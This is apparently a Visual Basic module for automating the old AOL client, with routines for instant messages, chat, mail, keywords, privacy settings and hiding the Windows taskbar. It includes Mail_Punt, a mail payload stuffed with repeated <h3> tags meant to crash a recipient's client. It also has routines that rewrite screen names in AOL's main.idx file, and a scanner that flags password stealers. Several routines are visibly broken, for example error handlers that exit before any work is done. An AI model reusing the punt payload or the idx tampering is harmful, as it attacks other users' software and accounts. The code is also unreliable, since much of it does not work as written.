Edit& = GetWindow(Create&, GW_HWNDNEXT)
Delete& = GetWindow(Edit&, GW_HWNDNEXT)
View& = GetWindow(Delete&, GW_HWNDNEXT)
PrivacyPref& = GetWindow(View&, GW_HWNDNEXT)
    Click PrivacyPref&
TimeOut (1.8)
Call Window_Close(SetupScreen&)
TimeOut (1.8)
'
Privacy& = FindWindowEx(AOLMDI(), 0&, vbNullString, "Privacy Preferences")
Block& = FindWindowEx(Privacy&, 0&, vbNullString, "Block only those people whose screen names I list")
Click (Block&)
'
Who& = FindWindowEx(Privacy&, 0&, "_AOL_EDIT", vbNullString)
Call Window_SetText(Who&, SN)
SetWho& = FindWindowEx(Privacy&, 0&, "_AOL_ICON", vbNullString)
        Edit& = GetWindow(SetWho&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
        Edit& = GetWindow(Edit&, GW_HWNDNEXT)
Click Edit&
TimeOut (1.2)
        Save& = GetWindow(Edit&, GW_HWNDNEXT)
        Save& = GetWindow(Save&, GW_HWNDNEXT)
        Save& = GetWindow(Save&, GW_HWNDNEXT)
Click Save&
End Sub
Sub Mail_Forward()
Dim L As Long, NoFreeze As Long
Dim MailWin As Long, Button As Long
MailWin& = FindWindowEx(AOLMDI(), 0&, "AOL Child", vbNullString)
Button& = FindWindowEx(MailWin&, 0&, "_AOL_Icon", vbNullString)
For L = 1 To 8
    Button& = GetWindow(Button&, 2)
    NoFreeze& = DoEvents()
Next L
Click (Button&)
End Sub
Sub AddAnyUser(SN As String, RealSN As String, AolPath As String)
Dim sAOLPath As String
Screen.MousePointer = 11
Static m0226 As String * 40000, l9E68 As Long, l9E6A As Long
Dim l9E6C As Integer, l9E6E As Integer, l9E70 As Variant, l9E74 As Integer
If UCase$(Trim$(SN)) = RealSN Then MsgBox "SN Already Exists: Exit Sub"
On Error GoTo ItsOver
ItsOver:
Screen.MousePointer = 0
Exit Sub
If Len(SN) < 7 Then MsgBox ("SN Must Be At Least 7 Characters"): Exit Sub
RealSN = RealSN + String$(Len(SN) - 7, " ")
Let sAOLPath$ = (AolPath & "\idb\main.idx")
Open sAOLPath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(16384, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = RealSN
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(16384, " ")
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = RealSN
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 16384
Wend
Close #1
Screen.MousePointer = 0
Resume Next
End Sub
Sub AddNewUser(SN As String, AolPath As String)
Dim sSN As String, IdXPath As String
Screen.MousePointer = 11
Static m0226 As String * 40000, l9E68 As Long, l9E6A As Long
Dim l9E6C As Integer, l9E6E As Integer, l9E70 As Variant, l9E74 As Integer
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL Is Currently Set To New User"): Exit Sub
On Error GoTo ItsOver
ItsOver:
Screen.MousePointer = 0
Exit Sub
If Len(SN) < 7 Then MsgBox ("The SN Needs To Be At Least 7 Characters"): Exit Sub
sSN = "NewUser" + String$(Len(SN) - 7, " ")
Let IdXPath$ = (AolPath & "\idb\main.idx")
Open IdXPath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = sSN
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = sSN
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend
Close #1
    Screen.MousePointer = 0
Resume Next
End Sub
Function STR_Wavy(TheText As String)

Dim G As String, a As Long, W As Long, r As String
Dim U As String, S As String, T As String, P As String
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<sup>" & r$ & "</sup>" & U$ & "<sub>" & S$ & "</sub>" & T$
Next W
STR_Wavy = P$
End Function
Function Mail_CountNew()
Dim TControl As Long, TPage As Long, Tree As Long, MailBox As Long
Dim AOL As Long, MDI As Long, Thebox As Long, Count As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Thebox& = FindWindowEx(MDI&, 0&, vbNullString, UserSN & "'s Online Mailbox")
MailBox& = Thebox&
If MailBox& = 0& Then Exit Function
TControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
TPage& = FindWindowEx(TControl&, 0&, "_AOL_TabPage", vbNullString)
Tree& = FindWindowEx(TPage&, 0&, "_AOL_Tree", vbNullString)
Count& = SendMessage(Tree&, LB_GETCOUNT, 0&, 0&)
Mail_CountNew = Count&
'MsgBox "You Have " & Mail_CountNew & " New Mails"
End Function

Sub File_Delete(File$)
Dim NoFreeze As Long
If Not File_Exists(File$) Then Exit Sub
Kill File$
NoFreeze& = DoEvents()
End Sub


Sub DeleteListItem(List As ListBox, Item$)
Dim Remove As String
    Remove$ = List.ListIndex
    List.RemoveItem (Remove$)
End Sub

Function Mail_DeleteCurrent()
Dim AOL As Long, MDI As Long, MailWin As Long
Dim mailtree As Long, DeleteButton As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClIENT", vbNullString)
MailWin& = FindWindowEx(MDI&, 0&, vbNullString, "New Mail")
mailtree& = FindWindowEx(MailWin&, 0&, "_AOL_Tree", vbNullString)
DeleteButton& = FindWindowEx(MailWin&, 0&, vbNullString, "Delete")
Click (DeleteButton&)
End Function


Function DirExists(TheDir)
Dim Test As Integer
On Error Resume Next
    If Right(TheDir, 1) <> "/" Then TheDir = TheDir & "/"
Test = Len(Dir$(TheDir))
If Err Or Test = 0 Then DirExists = False: Exit Function
DirExists = True
End Function
Function File_Exists(ByVal FileName As String) As Integer
Dim Test As Integer
On Error Resume Next
    Test = Len(Dir$(FileName))
If Err Or Test = 0 Then File_Exists = False: Exit Function
File_Exists = True
End Function

Sub Fade(Msg As String)
Dim X As String
X = FadeByColor3(FADE_BLUE, FADE_GREEN, FADE_BLUE, Msg, True)
Call SendChat(X)
End Sub


Function File_GetAttributes(TheFile As String)
Dim File As String
    File = Dir(TheFile)
If File <> "" Then File_GetAttributes = GetAttr(TheFile)
End Function
Sub File_SetHidden(TheFile As String)
Dim File As String
    File = Dir(TheFile)
If File <> "" Then SetAttr TheFile, vbHidden
End Sub

Public Sub File_SetReadOnly(TheFile As String)
Dim File As String
    File = Dir(TheFile)
If File <> "" Then SetAttr TheFile, vbReadOnly
End Sub
Function FindChatRoom()
Dim AOL As Long, MDI As Long, Room As Long
Dim List As Long, Rich As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Room& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
List& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
Rich& = FindWindowEx(Room&, 0&, "RICHCNTL", vbNullString)
If List& <> 0 And Rich& <> 0 Then
FindChatRoom& = Room&
Else:
   FindChatRoom& = 0
End If
End Function
Function FindRoom()
'Added This Because Of The FrENzY32_Misc Needs It
Dim AOL As Long, MDI As Long, Room As Long
Dim List As Long, Rich As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Room& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
List& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
Rich& = FindWindowEx(Room&, 0&, "RICHCNTL", vbNullString)
If List& <> 0 And Rich& <> 0 Then
FindChatRoom = Room&
Else:
   FindChatRoom = 0
End If
End Function




Sub LoadFonts(List As Control)
Dim X As Long
List.Clear
For X = 1 To Screen.FontCount
    List.AddItem Screen.Fonts(X - 1)
Next
End Sub
Function GetClass(child)
Dim sString As String, Plop As String
sString$ = String$(250, 0)
    GetClass = GetClassName(child, Plop$, 250)
    GetClass = sString$
End Function
Function GetCaption(Window)
Dim WindowTitle As String, WindowText As String, WindowLength As Long
WindowLength& = GetWindowTextLength(Window)
    WindowTitle$ = String$(WindowLength&, 0)
    WindowText$ = GetWindowText(Window, WindowTitle$, (WindowLength& + 1))
    GetCaption = WindowTitle$
End Function

Function GetText(child)
Dim TheTrimmer As Long, TrmSpace As String, GetStr As Long
TheTrimmer& = SendMessageByNum(child, 14, 0&, 0&)
    TrmSpace$ = Space$(TheTrimmer)
GetStr = SendMessageByString(child, 13, TheTrimmer + 1, TrmSpace$)
    GetText = TrmSpace$
End Function


Function AOL_Hide()
Dim AOL As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL&, 0)
End Function
Function TaskBar_Hide()
Dim Bar As Long
Bar& = FindWindow("Shell_TrayWnd", vbNullString)
Call ShowWindow(Bar&, 0)
End Function
Function TaskBar_Show()
Dim Bar As Long
Bar& = FindWindow("Shell_TrayWnd", vbNullString)
    Call ShowWindow(Bar&, 5)
End Function
Function StartButton_Hide()
Dim Bar As Long, Button As Long
Bar& = FindWindow("Shell_TrayWnd", vbNullString)
Button& = FindWindowEx(Bar&, 0&, "Button", vbNullString)
Call ShowWindow(Button&, 0)
End Function
Function StartButton_Show()
Dim Bar As Long, Button As Long
Bar& = FindWindow("Shell_TrayWnd", vbNullString)
Button& = FindWindowEx(Bar&, 0&, "Button", vbNullString)
    Call ShowWindow(Button&, 5)
End Function

Sub HowToMakeScrollBars()
'OK Per Label (Which is used for the Color To Fade), You Need 3 ScrollBars
'We'll Do 3 Labels (9Bars) Used In Fade3Colors
'Make 3 Labels And Name Them Color1, Color2, And Color3
'Make 9 ScrollBars
'Set The Property "Max" to 255
'Then Put Them Next To Each Other With A Space Every 3 Bars
'The First 3 Bars Name Red1, Green1, Blue1
'Then Double Click On Red1
'GoTo The The Drop Menu Next To Proc:
'Go Down To Scroll
'And Put This In There
'Color1.BackColor = rgB(Red1.value, Green1.value, Blue1.value)
'Do The Same To Blue1 And Green1
'Now Do The Same To Red2, Green2, Blue2(Which Are The Next 3 Scroll Bars)
'Then Put That Code In The Scroll Statement Except Change It To
'Color2.BackColor = rgB(Red2.value, Green2.value, Blue2.value)
'And Repeat The Same With Red3, Green3, Blue3
'With This Lesson You Can Make A 10 Color Scroller Also
End Sub

Sub IM_Send(SN, Msg)
Dim AOL As Long, MDI As Long, Buddy As Long, IMWin As Long
Dim Icon As Long, Edit As Long, RichTXT As Long, Button As Long
Dim OK As Long, L As Long, X As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Buddy& = FindWindowEx(MDI&, 0&, vbNullString, "Buddy List Window")
If Buddy& = 0 Then
    Call Keyword("BuddyView")
    Do: DoEvents
    Loop Until Buddy& <> 0
End If
Icon& = FindWindowEx(Buddy&, 0&, "_AOL_Icon", vbNullString)
For L = 1 To 2
    Icon& = GetWindow(Icon&, 2)
Next L
TimeOut (0.01)
Click (Icon&)
Do: DoEvents
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "Send Instant Message")
    Edit& = FindWindowEx(IMWin&, 0&, "_AOL_Edit", vbNullString)
        RichTXT& = FindWindowEx(IMWin&, 0&, "RICHCNTL", vbNullString)
            Button& = FindWindowEx(IMWin&, 0&, "_AOL_Icon", vbNullString)
Loop Until Edit& <> 0 And RichTXT& <> 0 And Button& <> 0
    Call SendMessageByString(Edit&, WM_SETTEXT, 0, SN)
    Call SendMessageByString(RichTXT&, WM_SETTEXT, 0, Msg)
For X = 1 To 9
    Button& = GetWindow(Button&, 2)
Next X
TimeOut (0.01)
Click (Button&)
Do: DoEvents
AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
        IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "Send Instant Message")
            OK& = FindWindow("#32770", "America Online")
If OK& <> 0 Then Call SendMessage(OK&, WM_CLOSE, 0, 0)
                 Call SendMessage(IMWin&, WM_CLOSE, 0, 0)
Exit Do
If IMWin& = 0 Then Exit Do
Loop
End Sub
Sub IM_Keyword(SN, Msg)
Dim AOL As Long, MDI As Long, IMWin As Long, OK As Long
Dim Edit As Long, Rich As Long, Button As Long, X As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Call Keyword("aol://9293:")
Do: DoEvents
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "Send Instant Message")
Edit& = FindWindowEx(IMWin&, 0&, "_AOL_Edit", vbNullString)
Rich& = FindWindowEx(IMWin&, 0&, "RICHCNTL", vbNullString)
Button& = FindWindowEx(IMWin&, 0&, "_AOL_Icon", vbNullString)
Loop Until Edit& <> 0 And Rich& <> 0 And Button& <> 0
    Call SendMessageByString(Edit&, WM_SETTEXT, 0, SN)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, Msg)
For X = 1 To 9
    Button& = GetWindow(Button&, 2)
Next X
TimeOut (0.01)
Click (Button&)
Do: DoEvents
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "Send Instant Message")
OK& = FindWindow("#32770", "America Online")
If OK& <> 0 Then Call SendMessage(OK, WM_CLOSE, 0, 0)
                 Call SendMessage(IMWin&, WM_CLOSE, 0, 0)
Exit Do
If IMWin& = 0 Then Exit Do
Loop
End Sub

Function UserOnline()
If UserSN = "" Then UserOnline = False
UserOnline = True
End Function

Sub Keyword(word As String)
Dim AOL As Long, Toolbar As Long, ToolbarW As Long
Dim Button As Long, KWin As Long, Text As Long
Dim Button2 As Long, Icon As Long, MDI As Long, KwWin As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
    Toolbar& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
        ToolbarW& = FindWindowEx(Toolbar&, 0&, "_AOL_Toolbar", vbNullString)
            Button& = FindWindowEx(ToolbarW&, 0&, "_AOL_Icon", vbNullString)
For Icon = 1 To 20
    Button& = GetWindow(Button&, 2)
Next Icon
'If Youve Used The KillGlyph Then Change The Above Code To
'For Icon = 1 To 19
'    Button& = GetWindow(Button&, 2)
'Next Icon
Click (Button&)
Do: DoEvents
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
KWin& = FindWindowEx(MDI&, 0&, vbNullString, "Keyword")
Text& = FindWindowEx(KWin&, 0&, "_AOL_Edit", vbNullString)
Button2& = FindWindowEx(Text&, 0&, "_AOL_Icon", vbNullString)
Loop Until KwWin& <> 0 And Text& <> 0 And Button2& <> 0
    Call SendMessageByString(Text&, WM_SETTEXT, 0, word)
TimeOut (0.06)
Click (Button2&)
Click (Button2&)
End Sub
Function Kill_Glyph()
Dim AOL As Long, Toolbar As Long, ToolbarW As Long
Dim Glyph As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Toolbar& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
ToolbarW& = FindWindowEx(Toolbar&, 0&, "_AOL_Toolbar", vbNullString)
Glyph& = FindWindowEx(ToolbarW&, 0&, "_AOL_Glyph", vbNullString)
    Call SendMessage(Glyph&, WM_CLOSE, 0, 0)
End Function
Sub Kill_Modal()
Dim Modal As Long
Modal& = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal&, WM_CLOSE, 0, 0)
End Sub
Sub Kill_Wait()
Dim AOL As Long, Toolbar As Long, ToolbarW As Long, GetIcon As Long
Dim Button As Long, KWin As Long, Text As Long, Button2 As Long
Dim MDI As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
Toolbar& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
ToolbarW& = FindWindowEx(Toolbar&, 0&, "_AOL_Toolbar", vbNullString)
Button& = FindWindowEx(ToolbarW&, 0&, "_AOL_Icon", vbNullString)
For GetIcon = 1 To 19
    Button& = GetWindow(Button&, 2)
Next GetIcon
TimeOut (0.06)
Click (Button&)
Do: DoEvents
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
KWin& = FindWindowEx(MDI&, 0&, vbNullString, "Keyword")
Text& = FindWindowEx(KWin&, 0&, "_AOL_Edit", vbNullString)
Button2& = FindWindowEx(Text&, KWin&, "_AOL_Icon", vbNullString)
Loop Until KWin& <> 0 And Text& <> 0 And Button2& <> 0
Call SendMessage(KWin&, WM_CLOSE, 0, 0)
End Sub
Sub Window_Close(Window)
    Call SendMessageByNum(Window, WM_CLOSE, 0, 0)
End Sub
Function ChatLineMsg()
Dim Chat2Trim As String, ChatTrimNum As Integer
Dim ChatTrim As String
Chat2Trim = ChatLineSN
    ChatTrimNum = Len(ChatLineSN)
    ChatTrim$ = Mid$(Chat2Trim, ChatTrimNum + 4, Len(Chat2Trim) - Len(ChatLineSN))
ChatLineMsg = ChatTrim$
ChatLineMsg = ChatTrim$
End Function
Function ChatLineAndSN()
Dim Chat2Trim As String, Chrss As String, Chrs As String
Dim TheChatText As String, LastLen As String, LastLine As String
Dim GetChatText As Long, FindChar As Long
Chat2Trim$ = GetChatText
    For FindChar = 1 To Len(Chat2Trim$)
Chrss$ = Mid(Chat2Trim$, FindChar, 1)
Chrss$ = Chrss$ & Chrs$
If Chrss$ = Chr(13) Then TheChatText$ = Mid(Chrs$, 1, Len(Chrs$) - 1): Chrs$ = ""
Next FindChar
LastLen = Val(FindChar) - Len(Chrs$)
LastLine = Mid(Chat2Trim$, LastLen, Len(Chrs$))

ChatLineSN = LastLine
End Function
Function ChatLineSN()
Dim Chat2Trim As String, ChatTrim As String, SN As String, X As Long
Chat2Trim$ = ChatLineAndSN
ChatTrim$ = Left$(Chat2Trim$, 11)
For X = 1 To 11
    If Mid$(ChatTrim$, X, 1) = ":" Then
        SN = Left$(ChatTrim$, X - 1)
    End If
Next X
ChatLineSN = SN
End Function
Private Sub ListBox2Clipboard(List As ListBox)
Dim SN As Long, TheList As String
For SN = 0 To List.ListCount - 1
If SN = 0 Then
    TheList = List.List(SN)
Else
    TheList = TheList & "," & List.List(SN)
End If
Next
Clipboard.Clear
TimeOut 0.1
Clipboard.SetText TheList
End Sub

Sub SNList_Load(List As ListBox, CmmDlg As Control)
'CmmDlg Is The Control (CommonDialog32)
With CmmDlg
    .DialogTitle = "Load SN List"
    .CancelError = True
    .Filter = "Text File (*.txt)|*.txt"
    .FilterIndex = 0
    .ShowOpen
End With
Dim sSNList As String
Open CmmDlg.FileName For Input As #1
sSNList = Input(LOF(1), 1)
Close #1
Dim sChar As String
Dim sSN As String
Dim lPos As Long
sSN = ""
For lPos = 1 To Len(sSNList)
    sChar = Mid$(sSNList, lPos, 1)
    If sChar = "," Then
        List.AddItem sSN
        sSN = ""
    Else
         sSN = sSN & sChar
    End If
Next
Exit Sub
End Sub

Sub Scroll_Macro(Text$)
Dim counter As Long
If Mid(Text$, Len(Text$), 1) <> Chr$(10) Then Text$ = Text$ + Chr$(13) + Chr$(10)
Do While (InStr(Text$, Chr$(13)) <> 0)
    counter = counter + 1
    Call SendChat(Mid(Text$, 1, InStr(Text$, Chr(13)) - 1))
    If counter = 4 Then
        TimeOut (2.9)
        counter = 0
    End If
    Text$ = Mid(Text$, InStr(Text$, Chr(13) + Chr(10)) + 2)
Loop
End Sub
Sub RunMenuByString(Window, StringSearch)
Dim FindWin As Long, CountMenu As Long, FindString As Long, MenuItem As Long
Dim FindWinSub As Long, MenuItemCount As Long, getstring As Long
Dim SubCount As Long, MenuString As String, GetStringMenu As Long
FindWin& = GetMenu(Window)
CountMenu& = GetMenuItemCount(FindWin&)

For FindString = 0 To CountMenu& - 1
    FindWinSub& = GetSubMenu(FindWin&, FindString)
    MenuItemCount& = GetMenuItemCount(FindWinSub&)
For getstring = 0 To MenuItemCount& - 1
    SubCount& = GetMenuItemID(FindWinSub&, getstring)
    MenuString$ = String$(100, " ")
    GetStringMenu& = GetMenuString(FindWinSub&, SubCount&, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(StringSearch)) Then
    MenuItem& = SubCount&
    GoTo MatchString
End If
Next getstring
Next FindString

MatchString:
    Call SendMessage(Window, WM_COMMAND, MenuItem&, 0)
End Sub

Sub Mail_Punt(Recipiants, subject)
Dim Punt1 As String, Punt2 As String
Punt1 = "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
Punt2 = "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>"
    Call Mail_Send(Recipiants, subject, Punt1 & Punt2)
End Sub
Sub MakeShortcut(ShortcutDir, ShortcutName, ShortcutPath)
Dim WinShortcutDir As String, WinShortcutName As String, WinShortcutExePath As String, RetVal As Long
    WinShortcutDir$ = ShortcutDir
    WinShortcutName$ = ShortcutName
    WinShortcutExePath$ = ShortcutPath
RetVal& = fCreateShellLink("", WinShortcutName$, WinShortcutExePath$, "")
    Name "C:\Windows\Start Menu\Programs\" & WinShortcutName$ & ".LNK" As WinShortcutDir$ & "\" & WinShortcutName$ & ".LNK"
End Sub
Function IM_MsgFrom()
Dim AOL As Long, MDI As Long, IMWin As Long, IMSn As Long, IMMsG As String
Dim IMTextWin As Long, IMWerds As String, SN As String, SNLen As Long, IMMssG As String
Dim Trimmer As Long, IMmessage As String
AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
        IMWin& = FindWindowEx(MDI&, 0&, vbNullString, ">Instant Message From:")
If IMWin& Then GoTo Found
    IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "  Instant Message From:")
If IMWin& Then GoTo Found
Exit Function
Found:
IMTextWin& = FindWindowEx(IMWin&, 0&, "RICHCNTL", vbNullString)
    IMWerds = GetText(IMTextWin&)
    SN = IM_SNFrom()
    SNLen = Len(IM_SNFrom()) + 3
    Trimmer& = Mid(IMMsG, InStr(IMMssG, SN) + SNLen)
    IMmessage = Left(Trimmer&, Len(Trimmer&) - 1)
End Function


Function Mail_ReadCurrent()
Dim AOL As Long, MDI As Long, MailWin As Long, mailtree As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
MailWin& = FindWindowEx(MDI&, 0&, "New Mail", vbNullString)
mailtree& = FindWindowEx(MailWin&, 0&, "_AOL_Tree", vbNullString)
    Call SendMessage(mailtree&, WM_KEYDOWN, VK_RETURN, 0)
    Call SendMessage(mailtree&, WM_KEYUP, VK_RETURN, 0)
End Function
Sub ParentChange(Frm As Form, Window&)
    Call SetParent(Frm.hwnd, Window&)
End Sub

Sub Scan_PWS(FilePath$, FileName$, Status As Label, ProgName As String)
'Taken From Genozide7.bas
Dim TheFileLen, NumOne, GenOiZBack, GenOziDe, TheFileInfo$, PWS, PWS2, PWS3, VirusedFile, LengthOfFile, TotalRead, TheTab, TheMSg, TheMsg2, TheMsg3, TheMsg4, TheMsg5, TheDots, StopPWScanner As Boolean, PentiumRest As Long
StopPWScanner = 0
If FileName$ = "" Then GoTo Errorr
FileName$ = FilePath$ & "\" & FileName$
If Right$(FilePath$, 1) = "\" Then FileName$ = FilePath$ & FileName$
If Not File_Exists(FileName$) Then MsgBox "File Not Found!", 16, "Error": GoTo Errorr
TheFileLen = FileLen(FileName$)
Status.Caption = TheFileLen
NumOne = 1
GenOiZBack = 2
GenOziDe = 3
Do While GenOziDe > GenOiZBack
PentiumRest& = DoEvents()
If StopPWScanner = 1 Then GoTo Errorr
Open FileName$ For Binary As #1
If Err Then MsgBox "An unexpected error occured while opening file!", 16, "Error": GoTo Errorr
TheFileInfo$ = String(32000, 0)
Get #1, NumOne, TheFileInfo$
Close #1
Open FileName$ For Binary As #2
If Err Then MsgBox "An unexpected error occured while opening file!", 16, "Error": GoTo Errorr
PWS = InStr(1, LCase$(TheFileInfo$), "main.idx" + Chr(0), 1)
If PWS Then
Geno:
Mid(TheFileInfo$, PWS) = "GenOziDe  "
PWS2 = Mid(LCase$(TheFileInfo$), PWS + 8 + 1, 8)
PWS2 = Trm(PWS2)
PWS3 = Mid(LCase$(TheFileInfo$), PWS + 8 + 1 + Len(PWS), 1)
If PWS3 <> Chr(0) Then GoTo DeliriuM
If Len(PWS2) < 4 Then GoTo DeliriuM
If Len(PWS2) = "" Then GoTo DeliriuM
DeliriuM:
PWS = InStr(1, LCase$(TheFileInfo$), "main.idx" + Chr(0), 1)
If PWS <> 0 Then VirusedFile = FileName$: MsgBox VirusedFile & " is a Password Stealer!", 16, "Password Stealer": Close #2: Exit Sub
End If
TotalRead = TotalRead + 32000
Status.Caption = Val(TotalRead)
LengthOfFile = LOF(2)
Close #2
If TotalRead > LengthOfFile Then: Status.Caption = LengthOfFile: GoTo GOD
DoEvents
Loop
GOD:
TheTab = Chr$(9) & Chr$(9)
TheDots = "---------------------------------------------------------"
TheMSg = TheDots & Chr(13) & "File Information:" & Chr(13) & Chr(13)
